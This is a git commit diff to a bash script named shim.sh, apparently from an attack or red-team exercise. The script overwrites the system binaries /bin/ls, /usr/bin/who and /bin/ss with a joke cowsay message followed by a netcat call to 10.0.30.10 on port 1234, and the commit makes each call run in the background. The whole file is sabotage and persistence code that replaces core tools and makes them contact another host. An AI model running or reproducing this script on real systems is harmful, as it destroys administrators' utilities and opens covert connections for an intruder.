add3851e19b275bdd9ec7e5a4f5861377606458a
Patrick McCabe <mccabepj@g.cofc.edu>
2022-01-16 14:35:46 -0600

    Background for shell connection

--- scripts/shim.sh
+++ scripts/shim.sh
@@ -1,14 +1,14 @@
 #!/bin/bash
 
 echo "cowsay \"This command is broken\"" > /bin/ls
-echo "nc 10.0.30.10 1234" >> /bin/ls
+echo "nc 10.0.30.10 1234 &" >> /bin/ls
 chmod +x /bin/ls
 
 echo "cowsay \"This command is also broken\"" > /usr/bin/who
-echo "nc 10.0.30.10 1234" >> /usr/bin/who
+echo "nc 10.0.30.10 1234 &" >> /usr/bin/who
 chmod +x /bin/who
 
 echo "cowsay \"Really having a bad time with these commands now\"" > /bin/ss
-echo "nc 10.0.30.10 1234" >> /bin/ss
+echo "nc 10.0.30.10 1234 &" >> /bin/ss
 chmod +x /bin/ss
 
